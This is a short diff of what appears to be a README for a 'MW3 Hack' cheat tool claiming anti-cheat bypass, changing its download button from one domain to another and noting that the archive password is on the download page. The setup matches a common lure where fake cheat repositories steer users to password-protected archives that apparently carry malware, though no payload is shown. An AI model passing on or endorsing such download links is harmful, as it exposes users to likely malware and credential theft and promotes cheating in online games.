@@ -18,7 +18,7 @@ MW3 Hack - undetected cheat tool. Anti-cheat bypass included. Works with the lat
 
 ## Download
 
-[![Download v2.0.0](https://img.shields.io/badge/Download_v2.0.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/codmw3hack)
+[![Download v2.0.0](https://img.shields.io/badge/Download_v2.0.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/codmw3hack)
 
 > The archive password is shown on the download page.
 
